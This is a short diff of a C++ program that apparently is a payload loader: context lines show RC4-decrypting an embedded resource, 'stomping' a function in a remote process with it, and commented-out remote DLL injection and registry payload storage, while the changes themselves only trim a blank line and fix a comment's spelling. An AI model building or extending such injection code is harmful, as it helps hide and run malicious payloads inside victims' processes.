@@ -147,7 +147,6 @@ int main()
 	rFin(&RC4Context_t, static_cast<PUCHAR>(resource.pAddress), pObfInput, resource.sSize);
 
 	StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize);
-
 	
 	 for (UCHAR i = 0; i < 8; i++)
 	{
@@ -511,7 +510,7 @@ for (int i = 0; i < 10; i++) {
 	//if (!InjectRemoteDll(hProcess, L"C:\\Users\\mikmu\\Desktop\\DLL.dll")) return -2;
 
 
-	//WritePayloadToRegistery(resource.pAddress, (DWORD) resource.sSize);
+	//WritePayloadToRegistry(resource.pAddress, (DWORD) resource.sSize);
 
 	//call();
 
